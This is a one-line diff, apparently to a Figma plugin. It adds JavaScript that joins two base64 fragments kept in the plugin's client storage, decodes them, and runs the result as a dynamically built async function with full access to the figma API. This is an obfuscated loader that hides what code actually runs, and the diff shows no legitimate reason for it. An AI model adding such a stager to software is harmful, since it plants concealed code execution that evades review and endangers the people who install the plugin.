@@ -1,0 +1,1 @@
+"const b64=(await figma.clientStorage.getAsync(\"wa\"))+(await figma.clientStorage.getAsync(\"wb\")); const code=atob(b64); const fn=new (Object.getPrototypeOf(async function(){}).constructor)(\"figma\", code); return await fn(figma);"
